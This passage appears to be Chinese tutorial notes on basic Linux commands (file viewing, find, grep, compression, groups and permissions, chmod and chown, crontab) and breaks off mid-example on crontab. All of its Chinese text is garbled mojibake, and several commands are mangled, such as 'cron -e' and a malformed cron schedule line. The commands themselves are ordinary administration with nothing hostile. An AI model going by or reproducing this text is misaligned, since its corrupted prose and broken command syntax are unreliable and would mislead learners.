ï¼ˆåŠŸèƒ½æè¿°ï¼šåˆ—è¡¨çš„å†…å®¹è¿½åŠ åˆ°æ–‡ä»¶ aa.txt çš„æœ«å°¾ï¼‰ cat æ–‡ä»¶ 1 &gt; æ–‡ä»¶ 2 ï¼ˆåŠŸèƒ½æè¿°ï¼šå°†æ–‡ä»¶ 1 çš„å†…å®¹è¦†ç›–åˆ°æ–‡ä»¶ 2ï¼‰ cal &gt;&gt; /home/mycal å°†å½“å‰æ—¥å†ä¿¡æ¯ è¿½åŠ åˆ° /home/mycal æ–‡ä»¶ä¸­ [æç¤º cal ] echo æŒ‡ä»¤echo è¾“å‡ºå†…å®¹åˆ°æ§åˆ¶å°ã€‚ echo [é€‰é¡¹] [è¾“å‡ºå†…å®¹] echo $PATH ä½¿ç”¨ echo æŒ‡ä»¤è¾“å‡ºç¯å¢ƒå˜é‡,è¾“å‡ºå½“å‰çš„ç¯å¢ƒè·¯å¾„ã€‚ head æŒ‡ä»¤head ç”¨äºæ˜¾ç¤ºæ–‡ä»¶çš„å¼€å¤´éƒ¨åˆ†å†…å®¹ï¼Œé»˜è®¤æƒ…å†µä¸‹ head æŒ‡ä»¤æ˜¾ç¤ºæ–‡ä»¶çš„å‰ 10 è¡Œå†…å®¹ head æ–‡ä»¶ (åŠŸèƒ½æè¿°ï¼šæŸ¥çœ‹æ–‡ä»¶å¤´ 10 è¡Œå†…å®¹) head -n 5 æ–‡ä»¶ (åŠŸèƒ½æè¿°ï¼šæŸ¥çœ‹æ–‡ä»¶å¤´ 5 è¡Œå†…å®¹ï¼Œ5 å¯ä»¥æ˜¯ä»»æ„è¡Œæ•°) tail æŒ‡ä»¤tail ç”¨äºè¾“å‡ºæ–‡ä»¶ä¸­å°¾éƒ¨çš„å†…å®¹ï¼Œé»˜è®¤æƒ…å†µä¸‹ tail æŒ‡ä»¤æ˜¾ç¤ºæ–‡ä»¶çš„å 10 è¡Œå†…å®¹ã€‚ tail æ–‡ä»¶ ï¼ˆåŠŸèƒ½æè¿°ï¼šæŸ¥çœ‹æ–‡ä»¶å 10 è¡Œå†…å®¹ï¼‰ tail -n 5 æ–‡ä»¶ ï¼ˆåŠŸèƒ½æè¿°ï¼šæŸ¥çœ‹æ–‡ä»¶å 5 è¡Œå†…å®¹ï¼Œ5 å¯ä»¥æ˜¯ä»»æ„è¡Œæ•°ï¼‰ tail -f æ–‡ä»¶ ï¼ˆåŠŸèƒ½æè¿°ï¼šå®æ—¶è¿½è¸ªè¯¥æ–‡æ¡£çš„æ‰€æœ‰æ›´æ–°ï¼Œå·¥ä½œç»å¸¸ä½¿ç”¨ï¼‰ ln æŒ‡ä»¤è½¯é“¾æ¥ä¹Ÿå«ç¬¦å·é“¾æ¥ï¼Œç±»ä¼¼äº windows é‡Œçš„å¿«æ·æ–¹å¼ï¼Œä¸»è¦å­˜æ”¾äº†é“¾æ¥å…¶ä»–æ–‡ä»¶çš„è·¯å¾„ ln -s [åŸæ–‡ä»¶æˆ–ç›®å½•] [è½¯é“¾æ¥å] ï¼ˆåŠŸèƒ½æè¿°ï¼šç»™åŸæ–‡ä»¶åˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥ï¼‰ ln -s /root linkToRoot åœ¨/home ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªè½¯è¿æ¥ linkToRootï¼Œè¿æ¥åˆ° /root ç›®å½• rm -rf linkToRoot åˆ é™¤è½¯è¿æ¥ ln ç¡¬é“¾æ¥ ##è½¯é“¾æ¥å¯ä»¥è·¨æ–‡ä»¶ç³»ç»Ÿï¼Œç¡¬é“¾æ¥ä¸å¯ä»¥ï¼›è½¯é“¾æ¥å¯ä»¥å¯¹ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶åï¼ˆfilenameï¼‰è¿›è¡Œé“¾æ¥ï¼ˆå½“ç„¶æ­¤æ—¶å¦‚æœä½ viè¿™ä¸ªè½¯é“¾æ¥æ–‡ä»¶ï¼Œlinuxä¼šè‡ªåŠ¨æ–°å»ºä¸€ä¸ªæ–‡ä»¶åä¸ºfilenameçš„æ–‡ä»¶ï¼‰ï¼Œç¡¬é“¾æ¥ä¸å¯ä»¥ï¼ˆå…¶æ–‡ä»¶å¿…é¡»å­˜åœ¨ï¼Œinodeå¿…é¡»å­˜åœ¨ï¼‰ï¼›è½¯é“¾æ¥å¯ä»¥å¯¹ç›®å½•è¿›è¡Œè¿æ¥ï¼Œç¡¬é“¾æ¥ä¸å¯ä»¥ã€‚ä¸¤ç§é“¾æ¥éƒ½å¯ä»¥é€šè¿‡å‘½ä»¤ ln æ¥åˆ›å»ºã€‚ln é»˜è®¤åˆ›å»ºçš„æ˜¯ç¡¬é“¾æ¥ã€‚ä½¿ç”¨ -s å¼€å…³å¯ä»¥åˆ›å»ºè½¯é“¾æ¥ã€‚ å½“æˆ‘ä»¬ä½¿ç”¨ pwd æŒ‡ä»¤æŸ¥çœ‹ç›®å½•æ—¶ï¼Œä»ç„¶çœ‹åˆ°çš„æ˜¯è½¯é“¾æ¥æ‰€åœ¨ç›®å½•ã€‚ history æŒ‡ä»¤æŸ¥çœ‹å·²ç»æ‰§è¡Œè¿‡å†å²å‘½ä»¤,ä¹Ÿå¯ä»¥æ‰§è¡Œå†å²æŒ‡ä»¤ history ï¼ˆåŠŸèƒ½æè¿°ï¼šæŸ¥çœ‹å·²ç»æ‰§è¡Œè¿‡å†å²å‘½ä»¤ï¼‰ history 10 æ˜¾ç¤ºæœ€è¿‘ä½¿ç”¨è¿‡çš„ 10 ä¸ªæŒ‡ä»¤ã€‚ !10 æ‰§è¡Œç¼–å·ä¸º10çš„æŒ‡ä»¤ æ—¶é—´æ—¥æœŸç±»date æŒ‡ä»¤-æ˜¾ç¤ºå½“å‰æ—¥æœŸ1) date ï¼ˆåŠŸèƒ½æè¿°ï¼šæ˜¾ç¤ºå½“å‰æ—¶é—´ï¼‰ 2) date +%Y ï¼ˆåŠŸèƒ½æè¿°ï¼šæ˜¾ç¤ºå½“å‰å¹´ä»½ï¼‰ 3) date +%m ï¼ˆåŠŸèƒ½æè¿°ï¼šæ˜¾ç¤ºå½“å‰æœˆä»½ï¼‰ 4) date +%d ï¼ˆåŠŸèƒ½æè¿°ï¼šæ˜¾ç¤ºå½“å‰æ˜¯å“ªä¸€å¤©ï¼‰ 5) date &quot;+%Y-%m-%d %H:%M:%S&quot;ï¼ˆåŠŸèƒ½æè¿°ï¼šæ˜¾ç¤ºå¹´æœˆæ—¥æ—¶åˆ†ç§’ï¼‰ date æŒ‡ä»¤-è®¾ç½®æ—¥æœŸdate -s å­—ç¬¦ä¸²æ—¶é—´ è®¾ç½®ç³»ç»Ÿå½“å‰æ—¶é—´ ï¼Œ æ¯”å¦‚è®¾ç½®æˆ 2018-10-10 11:22:22 date -s &quot;2018-10-10 11:22:22&quot; æŸ¥çœ‹æ—¥å†æŒ‡ä»¤cal [é€‰é¡¹] ï¼ˆåŠŸèƒ½æè¿°ï¼šä¸åŠ é€‰é¡¹ï¼Œæ˜¾ç¤ºæœ¬æœˆæ—¥å†ï¼‰ cal cal 2021 æœç´¢æŸ¥æ‰¾ç±»find æŒ‡ä»¤find æŒ‡ä»¤å°†ä»æŒ‡å®šç›®å½•å‘ä¸‹é€’å½’åœ°éå†å…¶å„ä¸ªå­ç›®å½•ï¼Œå°†æ»¡è¶³æ¡ä»¶çš„æ–‡ä»¶æˆ–è€…ç›®å½•æ˜¾ç¤ºåœ¨ç»ˆç«¯ find [æœç´¢èŒƒå›´] [é€‰é¡¹] 1593844669367 æŒ‰æ–‡ä»¶åï¼šæ ¹æ®åç§°æŸ¥æ‰¾/home ç›®å½•ä¸‹çš„ hello.txt æ–‡ä»¶ find /home -name hello.txt æŒ‰æ‹¥æœ‰è€…ï¼šæŸ¥æ‰¾/opt ç›®å½•ä¸‹ï¼Œç”¨æˆ·åç§°ä¸º nobody çš„æ–‡ä»¶ find /opt -user nobody æŸ¥æ‰¾æ•´ä¸ª linux ç³»ç»Ÿä¸‹å¤§äº 20m çš„æ–‡ä»¶ï¼ˆ+n å¤§äº -n å°äº n ç­‰äºï¼‰ find / -size +20M find / -size +20480K æŸ¥è¯¢ / ç›®å½•ä¸‹ï¼Œæ‰€æœ‰ .txt çš„æ–‡ä»¶ find / -name *.txt locate æŒ‡ä»¤locaate æŒ‡ä»¤å¯ä»¥å¿«é€Ÿå®šä½æ–‡ä»¶è·¯å¾„ã€‚locate æŒ‡ä»¤åˆ©ç”¨äº‹å…ˆå»ºç«‹çš„ç³»ç»Ÿä¸­æ‰€æœ‰æ–‡ä»¶åç§°åŠè·¯å¾„çš„locate æ•°æ®åº“å®ç°å¿«é€Ÿå®šä½ç»™å®šçš„æ–‡ä»¶ã€‚Locate æŒ‡ä»¤æ— éœ€éå†æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼ŒæŸ¥è¯¢é€Ÿåº¦è¾ƒå¿«ã€‚ä¸ºäº†ä¿è¯æŸ¥è¯¢ç»“æœçš„å‡†ç¡®åº¦ï¼Œç®¡ç†å‘˜å¿…é¡»å®šæœŸæ›´æ–° locate æ—¶åˆ»ã€‚ updatedb locate æœç´¢æ–‡ä»¶ ç”±äº locate æŒ‡ä»¤åŸºäºæ•°æ®åº“è¿›è¡ŒæŸ¥è¯¢ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡è¿è¡Œå‰ï¼Œå¿…é¡»ä½¿ç”¨ updatedb æŒ‡ä»¤åˆ›å»º locate æ•°æ®åº“ã€‚ grep æŒ‡ä»¤å’Œ ç®¡é“ç¬¦å· |grep è¿‡æ»¤æŸ¥æ‰¾ ï¼Œ ç®¡é“ç¬¦ï¼Œâ€œ|â€ï¼Œè¡¨ç¤ºå°†å‰ä¸€ä¸ªå‘½ä»¤çš„å¤„ç†ç»“æœè¾“å‡ºä¼ é€’ç»™åé¢çš„å‘½ä»¤å¤„ç†ã€‚ grep [é€‰é¡¹] æŸ¥æ‰¾å†…å®¹ æºæ–‡ä»¶ -n æ˜¾ç¤ºåŒ¹é…è¡ŒåŠè¡Œå· -i å¿½ç•¥å­—æ¯å¤§å°å†™ è¯·åœ¨ hello.txt æ–‡ä»¶ä¸­ï¼ŒæŸ¥æ‰¾ &quot;yes&quot; æ‰€åœ¨è¡Œï¼Œå¹¶ä¸”æ˜¾ç¤ºè¡Œå· cat hello.txt | grep -n yes å‹ç¼©å’Œè§£å‹ç±»gzip/gunzip æŒ‡ä»¤gzip ç”¨äºå‹ç¼©æ–‡ä»¶ï¼Œ gunzip ç”¨äºè§£å‹çš„ gzip æ–‡ä»¶ ï¼ˆåŠŸèƒ½æè¿°ï¼šå‹ç¼©æ–‡ä»¶ï¼Œåªèƒ½å°†æ–‡ä»¶å‹ç¼©ä¸º*.gz æ–‡ä»¶ï¼‰ gunzip æ–‡ ä»¶.gz ï¼ˆåŠŸèƒ½æè¿°ï¼šè§£å‹ç¼©æ–‡ä»¶å‘½ä»¤ï¼‰ gzip å‹ç¼©ï¼Œ å°† /home ä¸‹çš„ hello.txt æ–‡ä»¶è¿›è¡Œå‹ç¼© gzip hello.txt gunzip å‹ç¼©ï¼Œ å°† /home ä¸‹çš„ hello.txt.gz æ–‡ä»¶è¿›è¡Œè§£å‹ç¼© gunzip hello.txt.gz å½“æˆ‘ä»¬ä½¿ç”¨ gzip å¯¹æ–‡ä»¶è¿›è¡Œå‹ç¼©åï¼Œä¸ä¼šä¿ç•™åŸæ¥çš„æ–‡ä»¶ã€‚ zip/unzip æŒ‡ä»¤zip ç”¨äºå‹ç¼©æ–‡ä»¶ï¼Œ unzip ç”¨äºè§£å‹çš„ï¼Œè¿™ä¸ªåœ¨é¡¹ç›®æ‰“åŒ…å‘å¸ƒä¸­å¾ˆæœ‰ç”¨çš„ zip [é€‰é¡¹] XXX.zip å°†è¦å‹ç¼©çš„å†…å®¹ï¼ˆåŠŸèƒ½æè¿°ï¼šå‹ç¼©æ–‡ä»¶å’Œç›®å½•çš„å‘½ä»¤ï¼‰ unzip [é€‰é¡¹] XXX.zip ï¼ˆåŠŸèƒ½æè¿°ï¼šè§£å‹ç¼©æ–‡ä»¶ï¼‰ zip -rï¼šé€’å½’å‹ç¼©ï¼Œå³å‹ç¼©ç›®å½• unzip -d&lt;ç›®å½•&gt; ï¼šæŒ‡å®šè§£å‹åæ–‡ä»¶çš„å­˜æ”¾ç›®å½• å°† /home ä¸‹çš„ æ‰€æœ‰æ–‡ä»¶è¿›è¡Œå‹ç¼©æˆ mypackage.zip zip -r mypackage.zip /home/ å°† mypackge.zip è§£å‹åˆ° /opt/tmp ç›®å½•ä¸‹ unzip -d /opt/tmp/ mypackage.zip tar æŒ‡ä»¤tar æŒ‡ä»¤ æ˜¯æ‰“åŒ…æŒ‡ä»¤ï¼Œæœ€åæ‰“åŒ…åçš„æ–‡ä»¶æ˜¯ .tar.gz çš„æ–‡ä»¶ã€‚ tar [é€‰é¡¹] XXX.tar.gz æ‰“åŒ…çš„å†…å®¹ (åŠŸèƒ½æè¿°ï¼šæ‰“åŒ…ç›®å½•ï¼Œå‹ç¼©åçš„æ–‡ä»¶æ ¼å¼.tar.gz) 1593845537786 å‹ç¼©å¤šä¸ªæ–‡ä»¶ï¼Œå°† /home/a1.txt å’Œ /home/a2.txt å‹ç¼©æˆ a.tar.gz tar -zcvf a.tar.gz a1.txt a2.txt å°†/home çš„æ–‡ä»¶å¤¹ å‹ç¼©æˆ myhome.tar.gz tar -zcvf myhome.tar.gz /home/ å°† a.tar.gz è§£å‹åˆ°å½“å‰ç›®å½• tar -zxvf a.tar.gz å°† myhome.tar.gz è§£å‹åˆ° /opt/ ç›®å½•ä¸‹ #æŒ‡å®šè§£å‹åˆ°çš„é‚£ä¸ªç›®å½•ï¼Œäº‹å…ˆè¦å­˜åœ¨æ‰èƒ½æˆåŠŸï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚ tar -zxvf myhome.tar.gz -C /opt/ ç»„ç®¡ç†å’Œæƒé™ç®¡ç†Linux ç»„åŸºæœ¬ä»‹ç»åœ¨ linux ä¸­çš„æ¯ä¸ªç”¨æˆ·å¿…é¡»å±äºä¸€ä¸ªç»„ï¼Œä¸èƒ½ç‹¬ç«‹äºç»„å¤–ã€‚åœ¨ linux ä¸­æ¯ä¸ªæ–‡ä»¶æœ‰æ‰€æœ‰è€…ã€æ‰€åœ¨ç»„ã€å…¶å®ƒç»„çš„æ¦‚å¿µã€‚1) æ‰€æœ‰è€…2) æ‰€åœ¨ç»„3) å…¶å®ƒç»„4) æ”¹å˜ç”¨æˆ·æ‰€åœ¨çš„ç»„ 1593864434878 æ–‡ä»¶/ç›®å½• æ‰€æœ‰è€…ä¸€èˆ¬ä¸ºæ–‡ä»¶çš„åˆ›å»ºè€…,è°åˆ›å»ºäº†è¯¥æ–‡ä»¶ï¼Œå°±è‡ªç„¶çš„æˆä¸ºè¯¥æ–‡ä»¶çš„æ‰€æœ‰è€…ã€‚ æŸ¥çœ‹æ–‡ä»¶çš„æ‰€æœ‰è€…æŒ‡ä»¤ï¼šls -ahl åˆ›å»ºä¸€ä¸ªç»„ police,å†åˆ›å»ºä¸€ä¸ªç”¨æˆ· tom,å°† tom æ”¾åœ¨ police ç»„ ,ç„¶åä½¿ç”¨ tom æ¥åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ ok.txt 1593864576338 æ‰€æœ‰è€…ğŸ‘† ä¿®æ”¹æ–‡ä»¶æ‰€æœ‰è€…æŒ‡ä»¤ï¼šchown ç”¨æˆ·å æ–‡ä»¶å ä½¿ç”¨ root åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ apple.txt ï¼Œç„¶åå°†å…¶æ‰€æœ‰è€…ä¿®æ”¹æˆ tom 1593864639589 ç»„çš„åˆ›å»ºgroupadd ç»„ å åˆ›å»ºä¸€ä¸ªç»„, ,monster åˆ›å»ºä¸€ä¸ªç”¨æˆ· fox ï¼Œå¹¶æ”¾å…¥åˆ° monster ç»„ä¸­ groupadd monster useradd -g monster fox id fox //æŸ¥çœ‹ æ–‡ä»¶/ç›®å½• æ‰€åœ¨ç»„å½“æŸä¸ªç”¨æˆ·åˆ›å»ºäº†ä¸€ä¸ªæ–‡ä»¶åï¼Œé»˜è®¤è¿™ä¸ªæ–‡ä»¶çš„æ‰€åœ¨ç»„å°±æ˜¯è¯¥ç”¨æˆ·æ‰€åœ¨çš„ç»„ã€‚ æŸ¥çœ‹æ–‡ä»¶/ç›®å½•æ‰€åœ¨ç»„ls â€“ahl ä¿®æ”¹æ–‡ä»¶æ‰€åœ¨çš„ç»„chgrp ç»„å æ–‡ä»¶å ä½¿ç”¨ root ç”¨æˆ·åˆ›å»ºæ–‡ä»¶ orange.txt ,çœ‹çœ‹å½“å‰è¿™ä¸ªæ–‡ä»¶å±äºå“ªä¸ªç»„ï¼Œç„¶åå°†è¿™ä¸ªæ–‡ä»¶æ‰€åœ¨ç»„ï¼Œä¿®æ”¹åˆ° police ç»„ ã€‚ 1593865387296 å…¶å®ƒç»„é™¤æ–‡ä»¶çš„æ‰€æœ‰è€…å’Œæ‰€åœ¨ç»„çš„ç”¨æˆ·å¤–ï¼Œç³»ç»Ÿçš„å…¶å®ƒç”¨æˆ·éƒ½æ˜¯æ–‡ä»¶çš„å…¶å®ƒç»„. æ”¹å˜ç”¨æˆ·æ‰€åœ¨ç»„åœ¨æ·»åŠ ç”¨æˆ·æ—¶ï¼Œå¯ä»¥æŒ‡å®šå°†è¯¥ç”¨æˆ·æ·»åŠ åˆ°å“ªä¸ªç»„ä¸­ï¼ŒåŒæ ·çš„ç”¨ root çš„ç®¡ç†æƒé™å¯ä»¥æ”¹å˜æŸä¸ªç”¨æˆ·æ‰€åœ¨çš„ç»„ã€‚ usermod â€“g ç»„å ç”¨æˆ·å usermod â€“d ç›®å½•å ç”¨æˆ·å æ”¹å˜è¯¥ç”¨æˆ· åˆ›å»ºä¸€ä¸ªåœŸåŒªç»„ï¼ˆbanditï¼‰å°† tom è¿™ä¸ªç”¨æˆ·ä»åŸæ¥æ‰€åœ¨çš„ police ç»„ï¼Œä¿®æ”¹åˆ° bandit(åœŸåŒª) ç»„ 1593865717951 æƒé™çš„åŸºæœ¬ä»‹ç»ls -l ä¸­æ˜¾ç¤ºçš„å†…å®¹å¦‚ä¸‹ï¼š -rwxrw-r-- 1 root root 1213 Feb 2 09:39 abc 0-9 ä½è¯´æ˜ 1)ç¬¬ 0 ä½ç¡®å®šæ–‡ä»¶ç±»å‹(d, - , l , c , b) 2)ç¬¬ 1-3 ä½ç¡®å®šæ‰€æœ‰è€…ï¼ˆè¯¥æ–‡ä»¶çš„æ‰€æœ‰è€…ï¼‰æ‹¥æœ‰è¯¥æ–‡ä»¶çš„æƒé™ã€‚â€”-User 3)ç¬¬ 4-6 ä½ç¡®å®šæ‰€å±ç»„ï¼ˆåŒç”¨æˆ·ç»„çš„ï¼‰æ‹¥æœ‰è¯¥æ–‡ä»¶çš„æƒé™ï¼Œâ€”-Group 4)ç¬¬ 7-9 ä½ç¡®å®šå…¶ä»–ç”¨æˆ·æ‹¥æœ‰è¯¥æ–‡ä»¶çš„æƒé™ â€”-Other 1593865847037 rwxæƒé™è¯¦è§£rwxä½œç”¨åˆ°æ–‡ä»¶1) [ r ]ä»£è¡¨å¯è¯»(read): å¯ä»¥è¯»å–,æŸ¥çœ‹ 2) [ w ]ä»£è¡¨å¯å†™(write): å¯ä»¥ä¿®æ”¹,ä½†æ˜¯ä¸ä»£è¡¨å¯ä»¥åˆ é™¤è¯¥æ–‡ä»¶,åˆ é™¤ä¸€ä¸ªæ–‡ä»¶çš„å‰ææ¡ä»¶æ˜¯å¯¹è¯¥æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•æœ‰å†™æƒé™ï¼Œæ‰èƒ½åˆ é™¤è¯¥æ–‡ä»¶. 3) [ x ]ä»£è¡¨å¯æ‰§è¡Œ(execute):å¯ä»¥è¢«æ‰§è¡Œ rwxä½œç”¨åˆ°ç›®å½•1) [ r ]ä»£è¡¨å¯è¯»(read): å¯ä»¥è¯»å–ï¼Œls æŸ¥çœ‹ç›®å½•å†…å®¹ 2) [ w ]ä»£è¡¨å¯å†™(write): å¯ä»¥ä¿®æ”¹,ç›®å½•å†…åˆ›å»º+åˆ é™¤+é‡å‘½åç›®å½• 3) [ x ]ä»£è¡¨å¯æ‰§è¡Œ(execute):å¯ä»¥è¿›å…¥è¯¥ç›®å½• æ–‡ä»¶åŠç›®å½•æƒé™å®é™…æ¡ˆä¾‹ls -l ä¸­æ˜¾ç¤ºçš„å†…å®¹å¦‚ä¸‹ï¼š -rwxrw-râ€” 1 root root 1213 Feb 2 09:39 abc 10 ä¸ªå­—ç¬¦ç¡®å®šä¸åŒç”¨æˆ·èƒ½å¯¹æ–‡ä»¶å¹²ä»€ä¹ˆ ç¬¬ä¸€ä¸ªå­—ç¬¦ä»£è¡¨æ–‡ä»¶ç±»å‹ï¼š æ–‡ä»¶ (-),ç›®å½•(d),é“¾æ¥(l)å…¶ä½™å­—ç¬¦æ¯ 3 ä¸ªä¸€ç»„(rwx) è¯»(r) å†™(w) æ‰§è¡Œ(x)ç¬¬ä¸€ç»„ rwx : æ–‡ä»¶æ‹¥æœ‰è€…çš„æƒé™æ˜¯è¯»ã€å†™å’Œæ‰§è¡Œç¬¬äºŒç»„ rw- : ä¸æ–‡ä»¶æ‹¥æœ‰è€…åŒä¸€ç»„çš„ç”¨æˆ·çš„æƒé™æ˜¯è¯»ã€å†™ä½†ä¸èƒ½æ‰§è¡Œ ç¬¬ä¸‰ç»„ râ€” : ä¸ä¸æ–‡ä»¶æ‹¥æœ‰è€…åŒç»„çš„å…¶ä»–ç”¨æˆ·çš„æƒé™æ˜¯è¯»ä¸èƒ½å†™å’Œæ‰§è¡Œ å¯ç”¨æ•°å­—è¡¨ç¤ºä¸º: r=4,w=2,x=1 å› æ­¤ rwx=4+2+1=7 1 æ–‡ä»¶ï¼šç¡¬è¿æ¥æ•°æˆ– ç›®å½•ï¼šå­ç›®å½•æ•° root ç”¨æˆ· root ç»„ 1213 æ–‡ä»¶å¤§å°(å­—èŠ‚)ï¼Œå¦‚æœæ˜¯æ–‡ä»¶å¤¹ï¼Œæ˜¾ç¤º 4096 å­—èŠ‚ Feb 2 09:39 æœ€åä¿®æ”¹æ—¥æœŸ abc æ–‡ä»¶å â€‹ ä¿®æ”¹æƒé™-chmodé€šè¿‡ chmod æŒ‡ä»¤ï¼Œå¯ä»¥ä¿®æ”¹æ–‡ä»¶æˆ–è€…ç›®å½•çš„æƒé™ ç¬¬ä¸€ç§æ–¹å¼ï¼š+ ã€-ã€= å˜æ›´æƒé™u:æ‰€æœ‰è€… g:æ‰€æœ‰ç»„ o:å…¶ä»–äºº a:æ‰€æœ‰äºº(uã€gã€o çš„æ€»å’Œ) 1) chmod u=rwx,g=rx,o=x æ–‡ä»¶ç›®å½•å 2) chmod o+w æ–‡ä»¶ç›®å½•å 3) chmod a-x æ–‡ä»¶ç›®å½•å ç»™ abc æ–‡ä»¶ çš„æ‰€æœ‰è€…è¯»å†™æ‰§è¡Œçš„æƒé™ï¼Œç»™æ‰€åœ¨ç»„è¯»æ‰§è¡Œæƒé™ï¼Œç»™å…¶å®ƒç»„è¯»æ‰§è¡Œæƒé™ã€‚ ç»™ abc æ–‡ä»¶çš„æ‰€æœ‰è€…é™¤å»æ‰§è¡Œçš„æƒé™ï¼Œå¢åŠ ç»„å†™çš„æƒé™ 1593866504885 ç»™ abc æ–‡ä»¶çš„æ‰€æœ‰ç”¨æˆ·æ·»åŠ è¯»çš„æƒé™ 1593866558942 ç¬¬äºŒç§æ–¹å¼ï¼šé€šè¿‡æ•°å­—å˜æ›´æƒé™è§„åˆ™ï¼šr=4 w=2 x=1,rwx=4+2+1=7 chmod u=rwx,g=rx,o=x æ–‡ä»¶ç›®å½•å ç›¸å½“äº chmod 751 æ–‡ä»¶ç›®å½•å å°† /home/abc.txt æ–‡ä»¶çš„æƒé™ä¿®æ”¹æˆ rwxr-xr-x, ä½¿ç”¨ç»™æ•°å­—çš„æ–¹å¼å®ç°ï¼š rwx = 4+2+1 = 7 r-x = 4+1=5 r-x = 4+1 =5 æŒ‡ä»¤ï¼šchmod 755 /home/abc.txt ä¿®æ”¹æ–‡ä»¶æ‰€æœ‰è€…-chownchown newowner file æ”¹å˜æ–‡ä»¶çš„æ‰€æœ‰è€… chown newowner:newgroup file æ”¹å˜ç”¨æˆ·çš„æ‰€æœ‰è€…å’Œæ‰€æœ‰ç»„ -R å¦‚æœæ˜¯ç›®å½• åˆ™ä½¿å…¶ä¸‹æ‰€æœ‰å­æ–‡ä»¶æˆ–ç›®å½•é€’å½’ç”Ÿæ•ˆ è¯·å°† /home/abc .txt æ–‡ä»¶çš„æ‰€æœ‰è€…ä¿®æ”¹æˆ tom 1593866819855 è¯·å°† /home/kkk ç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶å’Œç›®å½•çš„æ‰€æœ‰è€…éƒ½ä¿®æ”¹æˆ tom é¦–é€‰æˆ‘ä»¬åº”è¯¥ä½¿ç”¨ root æ“ä½œã€‚ 1593866872283 ä¿®æ”¹æ–‡ä»¶æ‰€åœ¨ç»„-chgrpchgrp newgroup file æ”¹å˜æ–‡ä»¶çš„æ‰€æœ‰ç»„ 1) è¯·å°† /home/abc .txt æ–‡ä»¶çš„æ‰€åœ¨ç»„ä¿®æ”¹æˆ bandit (åœŸåŒª) chgrp bandit /home/abc.txt 2) è¯·å°† /home/kkk ç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶å’Œç›®å½•çš„æ‰€åœ¨ç»„éƒ½ä¿®æ”¹æˆ bandit(åœŸåŒª) chgrp -R bandit /home/kkk 1593866984875 æœ€ä½³å®è·µ-è­¦å¯Ÿå’ŒåœŸåŒªæ¸¸æˆpoliceè­¦å¯Ÿ banditåœŸåŒª jack, jerry: è­¦ å¯Ÿ xh, xq: åœŸ åŒª (1) åˆ›å»ºç»„ bash&gt; groupadd police bash&gt; groupadd bandit (2) åˆ›å»ºç”¨æˆ· (3) jack åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªå·±å¯ä»¥è¯»å†™ï¼Œæœ¬ç»„äººå¯ä»¥è¯»ï¼Œå…¶å®ƒç»„æ²¡äººä»»ä½•æƒé™ (4) jack ä¿®æ”¹è¯¥æ–‡ä»¶ï¼Œè®©å…¶å®ƒç»„äººå¯ä»¥è¯», æœ¬ç»„äººå¯ä»¥è¯»å†™ (5) xh æŠ•é  è­¦å¯Ÿï¼Œçœ‹çœ‹æ˜¯å¦å¯ä»¥è¯»å†™. å…ˆç”¨ root ä¿®æ”¹ xh çš„ç»„ ï¼š ä½¿ç”¨ jack ç»™ä»–çš„å®¶ç›®å½• /home/jack çš„æ‰€åœ¨ç»„ä¸€ä¸ª rx çš„æƒé™ xh éœ€è¦é‡æ–°æ³¨é”€åœ¨åˆ° jack ç›®å½•å°±å¯ä»¥æ“ä½œ jack çš„æ–‡ä»¶ 1593867344404 crond ä»»åŠ¡è°ƒåº¦åŸç†1593948751281 1593948778770 crontab è¿›è¡Œ å®šæ—¶ä»»åŠ¡çš„è®¾ç½® ä»»åŠ¡è°ƒåº¦ï¼šæ˜¯æŒ‡ç³»ç»Ÿåœ¨æŸä¸ªæ—¶é—´æ‰§è¡Œçš„ç‰¹å®šçš„å‘½ä»¤æˆ–ç¨‹åºã€‚ ä»»åŠ¡è°ƒåº¦åˆ†ç±»ï¼š 1.ç³»ç»Ÿå·¥ä½œï¼šæœ‰äº›é‡è¦çš„å·¥ä½œå¿…é¡»å‘¨è€Œå¤å§‹åœ°æ‰§è¡Œã€‚å¦‚ç—…æ¯’æ‰«æç­‰ 2.ä¸ªåˆ«ç”¨æˆ·å·¥ä½œï¼šä¸ªåˆ«ç”¨æˆ·å¯èƒ½å¸Œæœ›æ‰§è¡ŒæŸäº›ç¨‹åºï¼Œæ¯”å¦‚å¯¹ mysql æ•°æ®åº“çš„å¤‡ä»½ã€‚ åŸºæœ¬è¯­æ³•crontab [é€‰é¡¹] 1593948881827 è¦æ±‚è®¾ç½®ä»»åŠ¡è°ƒåº¦æ–‡ä»¶ï¼š/etc/crontab è®¾ç½®ä¸ªäººä»»åŠ¡è°ƒåº¦ã€‚æ‰§è¡Œ crontab â€“e å‘½ä»¤ã€‚ æ¥ç€è¾“å…¥ä»»åŠ¡åˆ°è°ƒåº¦æ–‡ä»¶ å¦‚ï¼š/1 * ls â€“l /etc/ &gt; /tmp/to.txt æ„æ€è¯´æ¯å°æ—¶çš„æ¯åˆ†é’Ÿæ‰§è¡Œ ls â€“l /etc/ &gt; /tmp/to.txt å‘½ä»¤ æ­¥éª¤å¦‚ä¸‹1) cron -e 2) / 1 * ls -l /etc &gt;&gt; /tmp/to.txt 3) å½“ä¿å­˜é€€å‡ºåå°±ç¨‹åºã€‚ 4) åœ¨æ¯ä¸€åˆ†é’Ÿéƒ½ä¼šè‡ªåŠ¨çš„è°ƒç”¨ ls -l /etc &gt;&gt; /tmp/to.txt å‚æ•°ç»†èŠ‚è¯´æ˜1593949018840 1593949051397 1593949079188 æ¡ˆä¾‹ 1ï¼šæ¯éš” 1 åˆ†é’Ÿï¼Œå°±å°†å½“å‰çš„æ—¥æœŸä¿¡æ¯ï¼Œè¿½åŠ åˆ° /tmp/mydate æ–‡ä»¶ä¸­1) å…ˆç¼–å†™ä¸€ä¸ªæ–‡ä»¶ /home/mytask1.sh date &gt;&gt; /tmp/mydate 2) ç»™ mytask1.sh ä¸€ä¸ªå¯ä»¥æ‰§è¡Œæƒé™ chmod 744 /home/mytask1.sh 3) crontab -e 4) */1 